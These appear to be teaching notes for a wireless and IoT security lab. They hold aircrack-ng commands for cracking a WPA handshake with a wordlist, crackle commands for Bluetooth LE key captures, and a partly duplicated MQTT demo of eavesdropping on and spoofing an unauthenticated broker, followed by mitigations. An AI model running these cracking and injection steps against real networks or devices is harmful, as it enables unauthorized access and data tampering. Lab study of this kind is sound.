Wifi

aircrack-ng wpa-Induction.pcap
aircrack-ng -w rockyou.txt -b 00:0C:41:82:B2:55 wpa-Induction.pcap



Bluetooth

git clone https://github.com/mikeryan/crackle
crackle -i ltk_exchange.pcap
crackle -i ltk_exchange.pcap -o some.pcap


Install MQTT tools:
 
sudo apt install mosquitto mosquitto-clients
DEMO STEPS (for MQTT attack):
Start the MQTT server (IoT hub):
 
mosquitto
This acts like an IoT base station.
 
Open another terminal: Simulate a device sending data:
 
mosquitto_pub -t "home/temperature" -m "24°C"
Open a third terminal: Spy on all data (attack):
 
mosquitto_sub -t "#" -v
You’ll see the message:
home/temperature 24°C


You're demonstrating a classic **MQTT attack scenario** — specifically an **unauthenticated publish/subscribe attack**. Here’s a quick breakdown of what’s happening and why it works:

---

### 🧰 **MQTT Tool Setup**

```bash
sudo apt install mosquitto mosquitto-clients
```

* Installs the MQTT broker (`mosquitto`) and client tools (`mosquitto_pub`, `mosquitto_sub`).

---

MQTT Demo Steps 1. Start MQTT Broker (Server)**

```bash
mosquitto
```

This launches a **default MQTT broker** on `localhost:1883`, **without authentication** or encryption.

---

#### **2. Simulate a Legitimate IoT Device**

```bash
mosquitto_pub -t "home/temperature" -m "24°C"
```

Publishes a message (`24°C`) to the topic `home/temperature`
3. Spy on All MQTT Traffic (Attacker)**

```bash
mosquitto_sub -t "#" -v
```

Subscribes to all topics (`#` is a wildcard). You’ll see:

home/temperature 24°C
4. Inject Fake Data (Malicious Device)

```bash
mosquitto_pub -t "home/temperature" -m "100°C"

Mitigations**

If you're deploying MQTT in production:

Enable authentication (user/pass).
Use TLS for encryption (`mosquitto --key`, `--cert`, `--cafile`).
Define ACLs (access control lists).
Use a firewall to limit access to the broker.

pretend to be a fake device and send wrong info:
 
mosquitto_pub -t "home/temperature" -m "100°C"
You just injected fake data — that’s an IoT attack.
